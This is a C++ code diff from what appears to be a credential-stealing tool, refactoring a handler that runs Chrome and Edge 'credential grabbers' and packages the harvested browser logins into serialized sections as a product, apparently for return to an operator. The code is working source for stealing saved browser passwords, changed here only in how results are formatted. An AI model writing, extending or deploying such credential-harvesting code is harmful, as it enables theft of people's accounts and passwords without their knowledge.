@@ -1,5 +1,6 @@
 ﻿#include "GetAllCredentialsHandler.hpp"
 
+#include "SerializableSection.hpp"
 #include "Trace.hpp"
 #include "../Grabbers/ChromeCredentialsGrabber.hpp"
 #include "../Grabbers/EdgeCredentialsGrabber.hpp"
@@ -24,8 +25,7 @@ std::wstring GetAllCredentialsHandler::format_credential(const Credential& crede
 
 void GetAllCredentialsHandler::run()
 {
-	static constexpr auto SUFFIX = L"\n";
-	std::wstring product;
+	std::vector<SerializableSection> sections;
 
 	for (const auto& grabber : make_grabbers())
 	{
@@ -36,22 +36,24 @@ void GetAllCredentialsHandler::run()
 		}
 		CATCH_AND_TRACE();
 
-		product.append(format_source(grabber->source()) + SUFFIX);
+		SerializableSection section{.name = format_source(grabber->source()), .objects = {}};
 
 		if (credentials.has_value())
 		{
-			for (const Credential& credential : *credentials) {
-				product.append(format_credential(credential) + SUFFIX);
-			}
+			section.objects.insert(
+				section.objects.end(),
+				std::make_move_iterator(credentials->begin()),
+				std::make_move_iterator(credentials->end())
+			);
 		}
 		else
 		{
-			product.append(std::wstring{L"#Not Supported"} + SUFFIX);
+			section.objects.emplace_back(std::make_unique<NotSupported>());
 		}
 
-		product.append(SUFFIX);
+		sections.push_back(std::move(section));
 	}
-	append(std::make_unique<TextTypedProduct>(product));
+	append(std::make_unique<TextTypedProduct>(SerializableSection::serialize_sections(sections)));
 	finished();
 }
 
